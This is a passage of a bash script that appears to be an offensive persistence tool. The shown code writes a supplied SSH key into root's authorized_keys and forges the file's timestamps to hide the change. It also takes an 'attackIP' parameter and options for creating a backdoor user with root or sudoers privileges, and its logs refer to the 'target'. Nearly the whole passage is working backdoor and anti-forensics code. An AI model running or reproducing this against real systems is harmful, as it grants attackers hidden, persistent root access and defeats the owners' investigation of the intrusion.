                 echo -e "\t* [${YELLOW}INFO${END} => SSH Key already have the proper permissions set!" >> "${LOG}"
               else
                 # Set proper permissions on authorized_keys
                 "${CHMOD}" 640  /root/.ssh/authorized_keys

                 setTime "${timestamp}" /root/.ssh/authorized_keys
                 verifyTime /root/.ssh/authorized_keys "${timestamp}"
               fi

               "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
               case $? in
                  0)
                     echo -e "\t+ [${GREEN}SUCCESS${END}] => User supplied SSH key successfully added to target!." >> "${LOG}"
                  ;;
                  *)
                     echo -e "\t- [${RED}FAILURE${END}] => An unknown error occured. Failed to add user supplied SSH key to target!." >> "${LOG}"
                  ;;
               esac
            else
               echo -e "\t- [${RED}FAILURE${END}] => Could not determine if /root/.ssh/authorized_keys exists or could be created!" >> "${LOG}"
               exit 1
            fi
         elif [ ! -d /root/.ssh ]
         then
            "${MKDIR}" -p /root/.ssh
            "${CHMOD}" 700 /root/.ssh

            if [ -f /root/.ssh/authorized_keys ]
            then
               timestamp=$(getTime /root/.ssh/authorized_keys)
            else
               "${TOUCH}" /root/.ssh/authorized_keys
               timestamp=$(getTime /etc/passwd)
            fi

            "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
            if [ $? == 0 ]
            then
              echo -e "\t* [${YELLOW}INFO${END} => SSH Key exists in /root/.ssh/authorized_keys!" >> "${LOG}"
            else
              echo "${sshKey}" >> /root/.ssh/authorized_keys
            fi

            keyPerms=$("${STAT}" -c %a /root/.ssh/authorized_key)
            if [ "${keyPerms}" == "640" ]
            then
              echo -e "\t* [${YELLOW}INFO${END} => SSH Key already have the proper permissions set!" >> "${LOG}"
            else
              # Set proper permissions on authorized_keys
              "${CHMOD}" 640  /root/.ssh/authorized_keys

              setTime "${timestamp}" /root/.ssh/authorized_keys
              verifyTime /root/.ssh/authorized_keys "${timestamp}"
            fi

            "${GREP}" -q "${sshKey}" /root/.ssh/authorized_keys
            case $? in
                0)
                   echo -e "\t+ [${GREEN}SUCCESS${END}] => User supplied SSH key successfully added to target!." >> "${LOG}"
                ;;
                *)
                   echo -e "\t- [${RED}FAILURE${END}] => An unknown error occured. Failed to add user supplied SSH key to target!." >> "${LOG}"
                   exit 1
                ;;
            esac
         else
            echo -e "\t- [${RED}FAILURE${END}] => An unknown error occured when determining if /root/.ssh exists or when attempting to create it" >> "${LOG}"
            exit 1
         fi
      else
         echo -e "\t- [${RED}FAILURE${END}] => No SSH key supplied, -k requires a parameter!" >> "${LOG}"
      fi

      shift
   fi

   if [ "${1}" == "-i" ]
   then
     shift
     if [ "${1}" == "" ]
     then
       echo -e "\t* [${RED}FAILURE${END}] => No text supplied!" >> "${LOG}"
       echo -e "\t* [${RED}FAILURE${END}] => The '-i' option is required!" >> "${LOG}"
       exit 1
     elif [ "${1}" != "" ]
     then
       attackIP="${1}"
     else
       echo -e "\t- [${RED}FAILURE${END}] => No input received, could not continue." >> "${LOG}"
     fi

     shift
   fi

   if [ "${1}" == "-u" ]
   then
     shift
     case "${1}" in
       "")
           echo -e "\t* [${YELLOW}INFO${END}] => No text supplied!" >> "${LOG}"
       ;;
       "root")
           echo -e "\t* [${YELLOW}INFO${END}] => Will create user with root pivileges!" >> "${LOG}"
           getUser="root"
       ;;
       "user")
           echo -e "\t* [${YELLOW}INFO${END}] => Will create user with user pivileges, but with sudoers access!" >> "${LOG}"
           getUser="user"
       ;;
       *)
           echo -e "\t- [${RED}FAILURE${END}] => Invalid input, please specify admin or user!" >> "${LOG}"
       ;;
     esac
   shift
   fi
done

main
